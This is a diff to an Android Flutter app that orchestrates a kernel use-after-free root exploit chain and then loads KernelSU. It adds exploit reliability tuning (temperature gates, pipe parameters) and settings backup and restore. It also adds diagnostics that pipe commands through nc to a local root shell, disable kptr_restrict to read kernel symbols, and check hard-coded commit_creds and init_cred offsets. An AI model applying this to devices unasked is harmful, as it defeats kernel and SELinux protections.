@@ -8,8 +8,36 @@ import 'dart:math';
 import 'package:flutter/foundation.dart';
 import 'package:flutter/services.dart' show rootBundle;
 
+import 'version.dart';
+
 import 'calib.dart';
 import 'shizuku.dart';
+
+/// 参数集（对应 PRE_PIPES）
+///   modern  = 新版，PRE_PIPES=512   —— 512KB 管道载体能建起来，落位约 80%
+///   classic = v1.0.16 原参数，PRE_PIPES=20000 —— 预算被占满、载体必然 EPERM，落位约 62%
+/// 默认 modern；classic 只用于回退对比与排障。
+enum ParamSet { modern, classic }
+
+/// 温度闸档位（真机实测：冷机 25–32°C 落位 80%/panic 7%；≥50°C 落位 42%/频繁重启）
+enum TempGate {
+  light('轻度', 48000, 6, 58000,
+      '≥48°C 才等，最多 60s；仍 >58°C 才放弃（跑得快，热机开打风险高）'),
+  normal('中等', 44000, 18, 55000,
+      '≥44°C 就开始等，最多 3 分钟；仍 >55°C 放弃（推荐）'),
+  strict('重度', 40000, 36, 50000,
+      '≥40°C 就等，最多 6 分钟；仍 >50°C 放弃（最稳，但很慢）');
+
+  const TempGate(this.title, this.limitMc, this.tries, this.abortMc, this.desc);
+  final String title;
+  final int limitMc;   // 等到低于这个温度才开打
+  final int tries;     // 最多等多少轮 × 10s
+  final int abortMc;   // 等满后仍高于此值 ⇒ 放弃本轮
+  final String desc;
+
+  static TempGate fromIdx(int i) =>
+      i >= 0 && i < TempGate.values.length ? TempGate.values[i] : TempGate.normal;
+}
 
 enum StageId { env, permissive, probe, phase1, phase2, root, ksu, verify }
 
@@ -54,6 +82,13 @@ class RootChain extends ChangeNotifier {
   final List<String> suggestions = [];
 
   bool running = false;
+
+  /// 链路正在跑（任何后台轮询/检查都应据此让路）
+  ///
+  /// 规则：**一旦开始跑链，就不再在运行期间做任何额外探测/更新检查**
+  /// （detectStatus、refreshHealth、更新检查、日志外的网络请求全部让路）。
+  /// 原因见 CHANGELOG v1.0.17：3s/5s 的重型轮询会把 UAF 释放的页重新占用，直接推高 panic 率。
+  bool get busy => running;
   bool shizukuOk = false;
   bool success = false;        // su 验证通过（整链成功）
   bool softRebootTried = false;
@@ -66,7 +101,43 @@ class RootChain extends ChangeNotifier {
   final Map<StageId, String> skipReason = {};  // 可跳过的阶段 → 原因
   bool alreadyRooted = false;                 // 探测到已越狱（su 可用）
   bool assetsReady = false;                   // 资产已在设备上（跳过重复写入）
+  // KernelSU 管理器的三项现场（环境预检就查，别等到 ⑧ 才发现没有 su）
+  bool ksuAppInstalled = false;                // APK 装了没（me.weishu.kernelsu）
+  bool ksuDirReady = false;                    // /data/adb/ksu 是否已初始化（模块加载后才可能出现）
+  String suPath = '';                          // su 实际所在路径（空 = 都没有）
+  String ksuAppVersion = '';                   // KernelSU 管理器版本（versionName）
+  String lastResetType = '';                   // sys.resettype：上次关机/重启类型（abnormal:AP_S_PANIC 等）
   String devState = '';                        // 一句话设备现状（用于界面）
+  Timer? _healthTimer;                        // 5s 主动刷新状态区
+  bool _healthBusy = false;                   // 防重入
+
+  // ---- 连点/连跑保护 ----
+  // 用户实测：连点"开始"会让设备连续重启，每次 panic 重启都在重新加热；
+  // 而且一轮跑完后立刻再点，命中率显著更差。所以：
+  //   · 运行中按钮禁用（原有）
+  //   · 一轮结束后进入冷却：成功 0s / 失败 90s / 疑似重启 180s
+  DateTime? _lastEndAt;
+  bool _lastRunFailed = false;
+  DateTime? _lastStartAt;
+  static const int _coolDownFailSec = 90;
+  static const int _coolDownPanicSec = 180;
+
+  /// 还要等多少秒才能再次点「开始」（0 = 可以点）
+  int get startCooldownLeft {
+    final end = _lastEndAt;
+    if (end == null) return 0;
+    final need = _lastRunFailed
+        ? (_rebootSeenInRun ? _coolDownPanicSec : _coolDownFailSec)
+        : 0;
+    if (need == 0) return 0;
+    final left = need - DateTime.now().difference(end).inSeconds;
+    return left > 0 ? left : 0;
+  }
+
+  bool get canStart => !running && startCooldownLeft == 0;
+
+  /// 本轮是否检测到过重启（panic）
+  bool _rebootSeenInRun = false;
   String shizukuVia = '';
 
   // ---- 可选项（持久化在 App 私有 SharedPreferences）----
@@ -74,6 +145,19 @@ class RootChain extends ChangeNotifier {
   bool optTap = true;        // 每轮自动点屏（防止 doze 导致命中率归零）
   bool optStayOn = true;     // 保持屏幕常亮
   bool optCleanup = true;    // 成功后清理已落盘的原生件与临时文件
+  // 开打前清理后台（默认关闭）。动机：后台 App 多时 pipe 页预算被占（F_SETPIPE_SZ=EPERM）、
+  // 页回收竞争变强 ⇒ 落位失败 ⇒ panic。恢复：软重启/正常重启即可，进程本来就会重建。
+  bool optKillBg = false;
+  /// 温度闸档位：等降温到多少度才开打 / 最多等多久 / 等满仍高于多少度就放弃本轮
+  TempGate optTempGate = TempGate.normal;
+
+  /// 参数集，默认新版；classic 用于回退到 v1.0.16 的参数
+  ParamSet optParamSet = ParamSet.modern;
+
+  /// 运行时把屏幕亮度压到最低。屏幕是 SoC 之外最大的热源，
+  /// 真机上 1 档与中高亮差 2–3°C；跑链时屏幕内容没人看，压暗只赚不亏。
+  bool optDim = true;
+  static const int kDimBrightness = 1;
 
   Future<void> loadOptions() async {
     final a = await ShizukuShell.getPref('opt.wifiOff');
@@ -84,10 +168,21 @@ class RootChain extends ChangeNotifier {
     if (b != null) optTap = b == '1';
     if (c != null) optStayOn = c == '1';
     if (d != null) optCleanup = d == '1';
+    final e2 = await ShizukuShell.getPref('opt.killBg');
+    if (e2 != null) optKillBg = e2 == '1';
+    final f2 = await ShizukuShell.getPref('opt.tempGate');
+    if (f2 != null) optTempGate = TempGate.fromIdx(int.tryParse(f2) ?? 1);
+    final h2 = await ShizukuShell.getPref('opt.paramSet');
+    if (h2 != null) {
+      optParamSet = (int.tryParse(h2) ?? 0) == 1 ? ParamSet.classic : ParamSet.modern;
+    }
+    final g2 = await ShizukuShell.getPref('opt.dim');
+    if (g2 != null) optDim = g2 == '1';
     notifyListeners();
   }
 
-  Future<void> setOptions({bool? wifiOff, bool? tap, bool? stayOn, bool? cleanup}) async {
+  Future<void> setOptions({bool? wifiOff, bool? tap, bool? stayOn, bool? cleanup,
+      bool? killBg, TempGate? tempGate, bool? dim, ParamSet? paramSet}) async {
     if (wifiOff != null) {
       optWifiOff = wifiOff;
       await ShizukuShell.setPref('opt.wifiOff', wifiOff ? '1' : '0');
@@ -100,9 +195,26 @@ class RootChain extends ChangeNotifier {
       optStayOn = stayOn;
       await ShizukuShell.setPref('opt.stayOn', stayOn ? '1' : '0');
     }
+    if (killBg != null) {
+      optKillBg = killBg;
+      await ShizukuShell.setPref('opt.killBg', killBg ? '1' : '0');
+    }
     if (cleanup != null) {
       optCleanup = cleanup;
       await ShizukuShell.setPref('opt.cleanup', cleanup ? '1' : '0');
+    }
+    if (tempGate != null) {
+      optTempGate = tempGate;
+      await ShizukuShell.setPref('opt.tempGate', '${tempGate.index}');
+    }
+    if (paramSet != null) {
+      optParamSet = paramSet;
+      await ShizukuShell.setPref('opt.paramSet',
+          paramSet == ParamSet.classic ? '1' : '0');
+    }
+    if (dim != null) {
+      optDim = dim;
+      await ShizukuShell.setPref('opt.dim', dim ? '1' : '0');
     }
     _advice();
     notifyListeners();
@@ -116,45 +228,128 @@ class RootChain extends ChangeNotifier {
         r'echo S=$(settings get global stay_on_while_plugged_in);'
         r'echo A=$(settings get global airplane_mode_on);'
         r'echo W=$(settings get global wifi_on);'
-        r'echo B=$(settings get global bluetooth_on)');
+        r'echo B=$(settings get global bluetooth_on);'
+        r'echo L=$(settings get system screen_brightness);'
+        r'echo M=$(settings get system screen_brightness_mode)');
     for (final line in r.out.split('\n')) {
       final i = line.indexOf('=');
       if (i <= 0) continue;
       final k = line.substring(0, i).trim();
       final v = line.substring(i + 1).trim();
-      if ('TSAWB'.contains(k) && v.isNotEmpty && v != 'null') _orig[k] = v;
+      if ('TSAWBLM'.contains(k) && v.isNotEmpty && v != 'null') _orig[k] = v;
     }
     _optApplied = true;
-    _log('[env] 已记录原设置：屏幕超时=${_orig['T']} 常亮=${_orig['S']} '
-        '飞行=${_orig['A']} wifi=${_orig['W']} bt=${_orig['B']}');
+    String g(String k) => _orig[k] ?? '(未记录)';
+    _log('[env] 已记录原设置：屏幕超时=${g('T')} 常亮=${g('S')} '
+        '飞行=${g('A')} wifi=${g('W')} bt=${g('B')}');
+
+    // ★ 落盘：panic 重启后进程的内存全没了，只有写盘才能在下一次开机时还原设置。
+    //   （用户踩过：一次 panic 之后屏幕超时/常亮/飞行就一直停在工具改过的值）
+    final body = _orig.entries.map((e) => '${e.key}=${e.value}').join('\n');
+    final b64 = base64Encode(utf8.encode(body));
+    await ShizukuShell.run('echo $b64 | base64 -d > $_optSnapPath 2>/dev/null');
+    _log('[env] 原设置已落盘：$_optSnapPath（panic 后下次开 App/开跑会自动还原）');
+  }
+
+  /// 选项快照文件（shell 可写；App 私有目录重启后还在，但 panic 后没法自动执行恢复）
+  String get _optSnapPath => '$workDir/opt_snapshot.txt';
+
+  /// 上次运行没走到「恢复」就结束（panic / 被杀 / 用户强退）⇒ 开机后自动按记录还原
+  bool _leftoverChecked = false;
+  String _loggedDevState = '';
+  String _loggedResetType = '';
+  String _loggedSkip = '';
+
+  Future<void> restoreLeftoverOptions() async {
+    if (_leftoverChecked) return;
+    _leftoverChecked = true;
+    try {
+      final r = await ShizukuShell.run('cat $_optSnapPath 2>/dev/null');
+      final txt = r.out.trim();
+      if (txt.isEmpty) return;
+      for (final line in txt.split('\n')) {
+        final i = line.indexOf('=');
+        if (i <= 0) continue;
+        final k = line.substring(0, i).trim();
+        final v = line.substring(i + 1).trim();
+        if ('TSAWBLM'.contains(k) && v.isNotEmpty && v != 'null') _orig[k] = v;
+      }
+      if (_orig.isEmpty) return;
+      _log('[opt] 发现上次运行遗留的设置快照（很可能是 panic 重启），正在按记录还原：'
+          '${_orig.entries.map((e) => '${e.key}=${e.value}').join(' ')}');
+      _optApplied = true;
+      await restoreOptions(all: true);
+    } catch (_) {}
+  }
+
+  /// 立刻关掉"屏幕常亮"（手动按钮用）
+  ///
+  /// 场景：用户在开发者选项里自己开过「保持唤醒 / Stay awake」，
+  /// 或跑完链后想马上恢复正常休眠，不想等下一轮 restore。
+  /// 做两件事：`svc power stayon false` + 把屏幕超时恢复成运行前的值（没记录就 30s）。
+  Future<void> disableStayOnNow() async {
+    final t = _orig['T'];
+    final timeout = (t != null && t != 'null') ? t : '30000';
+    final r = await ShizukuShell.run(
+        'svc power stayon false; '
+        'settings put system screen_off_timeout $timeout; '
+        'echo STAY=\$(settings get global stay_on_while_plugged_in); '
+        'echo TO=\$(settings get system screen_off_timeout)');
+    _log('[opt] 已手动关闭常亮：$timeout ms'
+        '${r.out.trim().isEmpty ? "" : "（${r.out.trim().replaceAll("\n", " ")}）"}');
+    notifyListeners();
   }
 
   /// 把选项改动过的系统设置恢复到运行前的状态
-  Future<void> restoreOptions() async {
-    if (!_optApplied) return;
-    final b = StringBuffer();
-    final t = _orig['T'];
-    if (optStayOn && t != null && t != 'null') {
-      b.write('settings put system screen_off_timeout $t; ');
-      final s0 = _orig['S'];
-      if (s0 != null) b.write('settings put global stay_on_while_plugged_in $s0; ');
+  Future<void> restoreOptions({bool all = false}) async {
+    if (!_optApplied) {
+      _log('[opt] 还没有记录运行前的原值（本次启动没跑过），无需恢复；'
+          '若只想关常亮，用「现在关闭常亮」按钮');
+      return;
     }
-    if (optWifiOff) {
+    final b = StringBuffer();
+    // 注意：这里不再判断 optStayOn —— 只要快照里记过，就按原值恢复。
+    // （原来写成 `if (optStayOn && ...)`，用户中途关掉开关后反而恢复不了）
+    // ★ 顺序很重要：先恢复 stay_on_while_plugged_in（开发者选项里的"保持唤醒"，
+    //   用户很难手动改回来），再恢复屏幕超时。
+    final t = _orig['T'];
+    final s0 = _orig['S'];
+    if (s0 != null && s0 != 'null') {
+      b.write('settings put global stay_on_while_plugged_in $s0; ');
+    }
+    if (t != null && t != 'null') {
+      b.write('settings put system screen_off_timeout $t; ');
+    }
+    if (s0 == null || s0 == 'null' || s0 == '0') {
+      b.write('svc power stayon false; ');
+    }
+    final l = _orig['L'];
+    final m = _orig['M'];
+    if (m != null && m != 'null') {
+      b.write('settings put system screen_brightness_mode $m; ');
+    } else if (optDim) {
+      // 快照缺失（首次运行就 panic / 读取失败）时也必须把**自动亮度**恢复回来：
+      // 压暗时我们写了 mode=0（关掉自动亮度），不恢复就等于永久改成手动。
+      b.write('settings put system screen_brightness_mode 1; ');
+    }
+    if (l != null && l != 'null') {
+      b.write('settings put system screen_brightness $l; ');
+    }
+    if (all || optWifiOff) {
       final a = _orig['A'];
       if (a != null) {
         b.write('settings put global airplane_mode_on $a; ');
         b.write('am broadcast -a android.intent.action.AIRPLANE_MODE --ez state '
             '${a == '1' ? 'true' : 'false'} >/dev/null 2>&1; ');
       }
-      final w = _orig['W'];
-      if (w != null) b.write('svc wifi ${w == '1' ? 'enable' : 'disable'}; ');
-      final bt = _orig['B'];
-      if (bt != null) b.write('svc bluetooth ${bt == '1' ? 'enable' : 'disable'}; ');
+      // WiFi/蓝牙不再单独恢复：关掉飞行模式后系统会按自身策略恢复射频，
+      // 强行 svc wifi/bluetooth 反而可能与飞行模式状态机冲突。
     }
     if (b.isEmpty) return;
     b.write('true');
     final r = await ShizukuShell.run(b.toString());
-    _log('[env] 已恢复原设置（屏幕超时/常亮/飞行/WiFi/蓝牙）rc=${r.code}');
+    await ShizukuShell.run('rm -f $_optSnapPath');
+    _log('[env] 已恢复原设置（屏幕超时/常亮/亮度/飞行模式）rc=${r.code}');
     _optApplied = false;
   }
 
@@ -170,8 +365,14 @@ class RootChain extends ChangeNotifier {
     if (optStayOn) {
       b.write('svc power stayon true; settings put system screen_off_timeout 1800000; ');
     }
+    if (optDim) {
+      b.write('settings put system screen_brightness_mode 0; '
+          'settings put system screen_brightness $kDimBrightness; ');
+    }
     if (optWifiOff) {
-      b.write('svc wifi disable; svc bluetooth disable; settings put global airplane_mode_on 1; '
+      // 只开飞行模式：WiFi/蓝牙由系统在切换飞行模式时自行关闭，
+      // 不再单独 `svc wifi/bluetooth disable`（多此一举，且会和系统的飞行模式状态机打架）。
+      b.write('settings put global airplane_mode_on 1; '
           'am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true >/dev/null 2>&1; ');
     }
     b.write('true');
@@ -243,13 +444,29 @@ class RootChain extends ChangeNotifier {
     }
   }
 
+  /// 去掉控制字符 / 私用区 / 代理区：底层的原生输出里混着二进制时，
+  /// Flutter 渲染不出来会变成一排 ▯（历史日志里出现过整屏方块）。
+  static String _san(String s) {
+    final sb = StringBuffer();
+    for (final r in s.runes) {
+      if (r == 0x0a) continue; // 行内不应有换行
+      if (r < 0x20 || r == 0x7f) continue;
+      if (r >= 0xD800 && r <= 0xDFFF) continue;
+      if (r >= 0xE000 && r <= 0xF8FF) continue;
+      if (r == 0xFFFD) continue;
+      sb.writeCharCode(r);
+    }
+    return sb.toString();
+  }
+
   void _log(String s) {
     if (s.isEmpty) return;
     final lines = s.split('\n');
     final buf = StringBuffer();
-    for (final l in lines) {
-      if (l.trim().isEmpty) continue;
-      final t = l.length > 400 ? '${l.substring(0, 400)}…' : l;
+    for (final raw in lines) {
+      final clean = _san(raw).trimRight();
+      if (clean.trim().isEmpty) continue;
+      final t = clean.length > 400 ? '${clean.substring(0, 400)}…' : clean;
       logs.add(t);
       buf.writeln(t);
     }
@@ -270,6 +487,263 @@ class RootChain extends ChangeNotifier {
     s.status = st;
     if (detail != null) s.detail = detail;
     notifyListeners();
+  }
+
+  /// 环境预检（② 一开始就跑）
+  ///
+  /// 判据与后果：
+  /// - **没装 KernelSU 管理器** ⇒ 直接拦：`su` 由管理器释放到 `/data/adb/ksu/bin`，
+  ///   模块加载成功也不会有 su，跑到 ⑧ 必失败（浪费 3–6 分钟）。
+  /// - 管理器版本与模板不同 ⇒ 只警告（多数 3.3.x 兼容），但要在日志里看得见。
+  /// - `/data/adb/ksu` 不存在 ⇒ 只提示：它要等模块加载后、管理器被打开一次才会被创建。
+  Future<void> _preflight() async {
+    final r = await ShizukuShell.run(
+      'echo APP=\$(pm list packages 2>/dev/null | grep -c me.weishu.kernelsu)'
+      '; echo VER=\$(dumpsys package me.weishu.kernelsu 2>/dev/null | sed -n "s/.*versionName=//p" | head -1)'
+      '; echo DIR=\$(ls -d /data/adb/ksu 2>/dev/null | head -1)'
+      '; echo SU=\$(command -v su 2>/dev/null)'
+      '; echo SUM=\$(ls /data/adb/ksu/bin/su 2>/dev/null)');
+    final out = r.out;
+    ksuAppInstalled = (RegExp(r'^APP=(\d+)', multiLine: true).firstMatch(out)?.group(1) ??
+            '0') !=
+        '0';
+    ksuAppVersion =
+        _normVer(RegExp(r'^VER=(\S+)', multiLine: true).firstMatch(out)?.group(1) ?? '');
+    ksuDirReady = RegExp(r'^DIR=/', multiLine: true).hasMatch(out);
+    suPath = RegExp(r'^SU=(\S+)', multiLine: true).firstMatch(out)?.group(1) ??
+        RegExp(r'^SUM=(\S+)', multiLine: true).firstMatch(out)?.group(1) ??
+        '';
+
+    final verTxt = ksuAppVersion.isEmpty ? '' : ' v$ksuAppVersion';
+    _log('[pre] KernelSU 管理器：'
+        '${ksuAppInstalled ? "已安装$verTxt（本模板对应 v$kKsuManagerVersion）" : "未安装（必需）"}');
+    _log('[pre] /data/adb/ksu：${ksuDirReady ? "已初始化" : "未初始化（正常：加载模块后本 App 会自己跑 libksud.so install 创建）"}');
+    if (suPath.isEmpty) {
+      // 有些实现里 su 已在 PATH 上（/system/bin/su 由 sucompat 提供），但 /data/adb/ksu/bin 没有
+      final t = await ShizukuShell.run('command -v su 2>/dev/null || echo -n');
+      final w = t.out.trim();
+      if (w.isNotEmpty) {
+        _log('[pre] su：$w（可用；/data/adb/ksu 未初始化不影响）');
+      } else {
+        _log('[pre] su：尚未提供（管理器初始化后才有）');
+      }
+    } else {
+      _log('[pre] su：$suPath');
+    }
+
+    // 双包共存检测：.debug 测试包和正式包会装在同一台机器上，各自都有 3s/5s 轮询。
+    // 两个 App 同时往竞态窗口里 spawn shell，会明显推高 panic 率（真机踩过）。
+    final dual = await ShizukuShell.run(
+        'echo D=\$(pm path com.noworld.rootkit 2>/dev/null | head -1 | wc -l)'
+        '; echo R=\$(ps -A -o NAME 2>/dev/null | grep -cx "com.noworld.rootkit")'
+        '; echo B=\$(ps -A -o NAME 2>/dev/null | grep -cx "com.noworld.rootkit.debug")');
+    final dInstalled = (RegExp(r'^D=(\d+)', multiLine: true).firstMatch(dual.out)?.group(1) ??
+            '0') !=
+        '0';
+    final rAlive = int.tryParse(
+            RegExp(r'^R=(\d+)', multiLine: true).firstMatch(dual.out)?.group(1) ?? '0') ??
+        0;
+    final bAlive = int.tryParse(
+            RegExp(r'^B=(\d+)', multiLine: true).firstMatch(dual.out)?.group(1) ?? '0') ??
+        0;
+    if (dInstalled && rAlive > 0 && bAlive > 0) {
+      _log('[pre] ⚠ 检测到正式包 com.noworld.rootkit 也在运行（两个 App 都在轮询）'
+          '⇒ 会挤占竞态窗口、显著提高 panic 率。建议先执行：'
+          'am force-stop com.noworld.rootkit（或临时卸载正式包），再跑本页');
+      suggestions.add('正式包还在后台跑：先 `am force-stop com.noworld.rootkit` 或临时卸载它，'
+          '否则两个 App 的定时轮询会互相干扰（panic 率明显上升）。');
+    }
+
+    if (!ksuAppInstalled) {
+      _stage(StageId.env, StageStatus.failed, detail: '未安装 KernelSU 管理器');
+      lastError = '未安装 KernelSU 管理器（me.weishu.kernelsu）v$kKsuManagerVersion。'
+          'su 由管理器释放，不装它整条链到 ⑧ 必失败：先装 KernelSU v$kKsuManagerVersion '
+          '并打开一次，再回到本页点开始。';
+      _log('[pre] ✗ 缺少 KernelSU 管理器 ⇒ 停止（否则 ⑧ 一定没有 su）');
+      _advice();
+      _stop = true;
+      return;
+    }
+    if (ksuAppVersion.isNotEmpty && ksuAppVersion != kKsuManagerVersion) {
+      _log('[pre] ⚠ 管理器 v$ksuAppVersion ≠ 模板 v$kKsuManagerVersion：'
+          '若 ⑦⑧ 异常，先换回 v$kKsuManagerVersion');
+    }
+    if (!ksuDirReady) {
+      _log('[pre] 提示：su 是管理器在**检测到内核后**释放到 /data/adb/ksu/bin 的；'
+          '加载完模块本 App 会自动拉起一次 KernelSU（不需要点它的"安装"——那是解锁后改 boot.img 的流程）');
+    }
+  }
+
+  // ---------------------------------------------------------------- 诊断（无法 adb 时靠它排障）
+  //
+  // 全部输出到 App 日志，用户截图就能定位问题。字段前缀统一 `[diag:<阶段>]` / `[diag-root:<阶段>]`。
+
+  /// shell 侧（uid 2000）能看到的现状：SELinux、机型、模块、KSU 管理器与 su 路径
+  Future<List<String>> _diag(String tag) async {
+    final out = <String>[];
+    try {
+      final r = await ShizukuShell.run(
+        'echo ENF=\$(getenforce 2>/dev/null)'
+        '; echo MODEL=\$(getprop ro.product.model)'
+        '; echo FP=\$(getprop ro.build.fingerprint)'
+        '; echo KREL=\$(uname -r)'
+        '; echo MODS=\$(grep -E "^(pwn|kernelsu)" /proc/modules 2>/dev/null | cut -d" " -f1 | tr "\\n" ",")'
+        '; echo KSUAPP=\$(pm list packages 2>/dev/null | grep -c me.weishu.kernelsu)'
+        '; echo KSUDIR=\$(ls -d /data/adb/ksu 2>/dev/null | head -1)'
+        '; echo KSUBIN=\$(ls /data/adb/ksu/bin 2>/dev/null | tr "\\n" ",")'
+        '; echo SU_WHICH=\$(command -v su 2>/dev/null)'
+        '; echo SU_SYS=\$(ls -l /system/bin/su 2>/dev/null | tr -s " " | cut -d" " -f1,9-)'
+        '; echo SU_KSU=\$(ls -l /data/adb/ksu/bin/su 2>/dev/null | tr -s " " | cut -d" " -f1,9-)'
+        '; echo SU_RAMDISK=\$(ls -l /debug_ramdisk/su 2>/dev/null | tr -s " " | cut -d" " -f1,9-)'
+        '; echo CTX=\$(id -Z 2>/dev/null)');
+      for (final line in r.out.split('\n')) {
+        final t = line.trim();
+        if (t.isNotEmpty) out.add(t);
+      }
+    } catch (_) {}
+    _log('[diag:$tag] ' + out.join(' | '));
+    return out;
+  }
+
+  /// root 侧（走 5556 自己的 root shell）才能看到的：内核符号、dmesg、KSU 目录权限
+  ///
+  /// 顺带核对「内核镜像是否与本机标定的一致」：用 5 个符号相对 _stext 的偏移和本机镜像比对。
+  /// 不符 ⇒ 这台机器的内核和已知镜像不同，后面的地址全都不可信（最该报给作者的信息）。
+  Future<void> _diagRoot(String tag, {bool viaSu = false}) async {
+    const expect = <String, int>{
+      'selinux_state': 0x27D7A60,
+      'init_task': 0x254DAC0,
+      'commit_creds': 0x2DCB48,
+      'prepare_kernel_cred': 0x4798B4,
+      'init_cred': 0x2563880,
+    };
+    try {
+      // kptr_restrict=2 时 /proc/kallsyms 对所有非特权域返回全 0。
+      // 我们自己的 root shell 是 ID=0，临时关掉再读，读完写回原值。
+      // kptr_restrict==2 时内核的 kallsyms_show_value() 无条件返回 0
+      // （uid=0/CAP_SYSLOG 也看不到），所以要在 root shell 里临时置 0、读完立刻写回。
+      // 先把「原始值」持久化，之后每次核对前若发现它被留在 0（上一次没恢复），自动写回。
+      // 本机原始值是 2（user build 默认），若是 0 也照用户的 0 处理。
+      final cmd = 'F=/data/local/tmp/rk/kptr_orig.txt'
+          '; K=\$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null || echo 2)'
+          '; O=\$(cat \$F 2>/dev/null)'
+          '; [ -z "\$O" ] && { echo "\$K" > \$F; O=\$K; }'
+          '; if [ "\$K" != "\$O" ]; then echo "\$O" > /proc/sys/kernel/kptr_restrict 2>/dev/null;'
+          ' echo KPTR_FIXED=\$K-\>\$O; K=\$O; fi'
+          '; echo ID=\$(id -u)'
+          '; echo CTX=\$(id -Z 2>/dev/null)'
+          '; echo KPTR_OLD=\$K'
+          '; echo 0 > /proc/sys/kernel/kptr_restrict; echo SET0_RC=\$?'
+          '; echo KPTR_AFTER=\$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)'
+          '; grep -E " (_stext|selinux_state|init_task|commit_creds|prepare_kernel_cred|init_cred)\$"'
+          ' /proc/kallsyms 2>/dev/null | head -8'
+          '; echo "\$O" > /proc/sys/kernel/kptr_restrict; echo RESTORE_RC=\$?'
+          '; echo KPTR_NOW=\$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)'
+          '; echo ---DMESG-KSU---'
+          '; dmesg 2>/dev/null | grep -iE "ksu|kernelsu" | tail -6';
+      // 通道选择：
+      // - 默认走 5556 的"root shell"（自己用 exploit 提权出来的那个，早期阶段只有它）
+      // - viaSu 时走 KernelSU 的 su -c（⑦ 之后 su 已可用；实测加载 KSU 后
+      //   5556 那个 shell 已经写不动 /proc/sys/kernel/kptr_restrict，会 Permission denied）
+      final r = await ShizukuShell.run(viaSu
+          ? 'su -c ${_shq(cmd)} 2>&1'
+          : 'echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
+      // 清洗 nc 回显的 shell 提示与续行标记
+      final lines = <String>[];
+      for (final raw in r.out.split('\n')) {
+        var l = raw.replaceAll('\r', '').trim();
+        if (l.isEmpty) continue;
+        if (l.startsWith("can't find tty fd")) continue;
+        if (l.contains("won't have full job control")) continue;
+        if (l.startsWith(':/data/local/tmp/rk #')) continue;
+        if (l.startsWith('>')) l = l.substring(1).trim();
+        if (l.isEmpty) continue;
+        lines.add(l);
+      }
+      if (lines.isNotEmpty) {
+        _log('[diag-root:$tag]');
+        for (final l in lines) {
+          _log('  $l');
+        }
+      }
+      final txt = lines.join('\n');
+      String kv(String k) =>
+          RegExp('^$k=(.*)\$', multiLine: true).firstMatch(txt)?.group(1)?.trim() ?? '';
+      final set0rc = kv('SET0_RC');
+      final kptrAfter = kv('KPTR_AFTER');
+      final kptrOld = kv('KPTR_OLD');
+      final restoreRc = kv('RESTORE_RC');
+      // ★ 置 0 失败就该立刻报错：这说明我们改不动 kptr_restrict（SELinux/只读/权限不足），
+      //   后面的'读不到'只是它的后果，不该笼统报成'核对无效'。
+      if ((set0rc != '0' || (kptrAfter.isNotEmpty && kptrAfter != '0')) && !viaSu) {
+        _log('[diag-root:$tag] root shell 写不动 kptr_restrict（rc=${set0rc.isEmpty ? "?" : set0rc}）'
+            '⇒ 改用 su 重试');
+        return _diagRoot(tag, viaSu: true);
+      }
+      if (set0rc != '0' || (kptrAfter.isNotEmpty && kptrAfter != '0')) {
+        _log('[diag-root:$tag] ✗ 临时置 kptr_restrict=0 失败'
+            '（通道=${viaSu ? "su -c" : "root shell"}, 原值=${kptrOld.isEmpty ? '?' : kptrOld}, '
+            '写入 rc=${set0rc.isEmpty ? '?' : set0rc}, 写后=${kptrAfter.isEmpty ? '?' : kptrAfter}）'
+            '⇒ 无法读取内核符号，本次核对无效');
+        return;
+      }
+      if (restoreRc.isNotEmpty && restoreRc != '0') {
+        _log('[diag-root:$tag] ⚠ kptr_restrict 恢复失败（rc=$restoreRc），当前值可能仍为 0，'
+            '重启可复位');
+      }
+      BigInt? stext;
+      final got = <String, BigInt>{};
+      var allZero = true;
+      for (final l in lines) {
+        final m = RegExp(r'^([0-9a-fA-F]{8,16})\s+\S\s+(\w+)').firstMatch(l);
+        if (m == null) continue;
+        final addr = BigInt.tryParse(m.group(1)!, radix: 16);
+        if (addr == null) continue;
+        if (addr != BigInt.zero) allZero = false;
+        final name = m.group(2)!;
+        if (name == '_stext') {
+          stext = addr;
+        } else if (expect.containsKey(name)) {
+          got[name] = addr;
+        }
+      }
+      // 这里只应该在'压根没有 root'时才发生（有 root 就一定能把 kptr_restrict 关掉读到真值）。
+      // 所以不再输出含糊的'跳过核对'——读不到本身就说明有问题，要显式报出来。
+      if (stext == null || got.isEmpty || allZero || stext == BigInt.zero) {
+        _log('[diag-root:$tag] ⚠ 内核符号读取失败（读到 ${got.length} 个符号、'
+            '${allZero ? "全为 0x0" : "缺失 _stext"}）⇒ **本次核对无效**，'
+            '既不能判定一致也不能判定不一致；请把这一行报给作者');
+        return;
+      }
+      final bad = <String>[];
+      for (final e in expect.entries) {
+        final a = got[e.key];
+        if (a == null) {
+          bad.add('${e.key}=缺失');
+          continue;
+        }
+        final off = a - stext;
+        if (off != BigInt.from(e.value)) {
+          bad.add('${e.key}=0x${off.toUnsigned(64).toRadixString(16)}'
+              '(期望0x${e.value.toRadixString(16)})');
+        }
+      }
+      if (bad.isEmpty) {
+        _log('[diag-root:$tag] 内核镜像核对：5/5 符号偏移一致 ⇒ 与内置标定同一镜像');
+      } else {
+        _log('[diag-root:$tag] 内核镜像核对：不一致 ⇐ ${bad.join(', ')}'
+            '（这台机器的内核与本机标定不同，需重新标定）');
+      }
+    } catch (e) {
+      _log('[diag-root:$tag] 采集失败：$e');
+    }
+  }
+
+  @override
+  void dispose() {
+    stopHealthPolling();
+    _flushTimer?.cancel();
+    super.dispose();
   }
 
   void _advice() {
@@ -297,6 +771,10 @@ class RootChain extends ChangeNotifier {
     }
     if (ksu.status == StageStatus.failed) {
       suggestions.add('KSU 加载失败：看日志里 ksupatch / ml2 的报错；模板与内核版本必须匹配。');
+    } else if (ksu.status == StageStatus.ok && _byId[StageId.verify]!.status == StageStatus.failed) {
+      suggestions.add('KernelSU 模块已在跑，但 su 不存在 —— su 由 KernelSU 管理器（App）释放到 '
+          '/data/adb/ksu/bin：打开 KernelSU，顶部若显示"未安装/点击安装"就按提示装一次，'
+          '再回到本页点开始（①–⑥ 会跳过）；日志里 [diag:ksu] / [diag-root:ksu] 有完整现场。');
     }
     if (env.status == StageStatus.failed) {
       suggestions.add('资产部署失败：确认 Shizuku 在线、/data/local/tmp 可写。');
@@ -468,6 +946,12 @@ class RootChain extends ChangeNotifier {
 
   Future<void> start() async {
     if (running) return;
+    if (startCooldownLeft > 0) {
